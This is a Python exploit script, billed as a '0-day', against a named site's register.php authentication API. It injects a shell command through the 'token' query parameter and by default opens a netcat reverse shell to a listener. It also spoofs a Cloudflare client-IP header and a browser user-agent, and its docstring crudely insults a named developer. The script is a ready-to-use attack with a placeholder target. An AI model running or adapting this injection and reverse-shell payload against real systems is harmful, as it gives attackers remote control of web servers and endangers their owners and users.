# CodeTheWorld authentication API command injection 0-day
# Author: checksum (0daySkid)

import requests
import urllib.parse


# configuration
TARGET = 'http://example.com/register.php'
COMMAND = 'nc 127.0.0.1 4444 -e /bin/bash'
QUERY = 'token=%s'


class Exploit:
    """ CodeTheWorld authentication API command injection 0-day
    
    Executes a simple command injection exploit, found in
    the register.php file of CodeTheWorld's authentication API.
    
    No need to bypass any filters here, as r00ntu/co9/b0nk/Jeff the eGod (skid)
    forgot to implement a command injection filter in the register.php file,
    probably because he was too high on his weed when making this shit.
    
    10/10 developer - still not better than YandereDev.
    """

    def __init__(self, target, query, command):
        self.target = target
        self.query = query
        self.command = command
        self.headers = {
            'CF-Connecting-IP': '127.0.0.1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 Edg/84.0.522.59'
        }


    def execute(self, encode: bool=True) -> requests.models.Response:
        """ Execute command injection 0-day exploit

        URl encodes the payload and executes it through a
        command injection vulnerability on the target site.

        Args:
            encode (bool): URL encode payload

        Returns:
            requests.models.Response: HTTP request response
        """
        # i.e grep -i '' /dev/null; echo "Hello World!" #/var/www/html/users.sql
        payload = f"'' /dev/null; {self.command} #"

        if encode:
            payload = urllib.parse.quote(payload)

        return requests.get(f'{self.target}?{self.query}' % payload, headers=self.headers)


def main():
    print('CodeTheWorld authentication API (register.php) command injection 0day by checksum (0daySkid)\n')

    print('Executing exploit...')

    exploit = Exploit(TARGET, QUERY, COMMAND)

    try:
        res = exploit.execute()

        print(f'Exploit executed!\n\nResponse code: {res.status_code}\nResponse body:\n {res.text}')

    except Exception as e:
        print(f'An error occured while executing exploit: {e}')


if __name__ == '__main__':
    main()
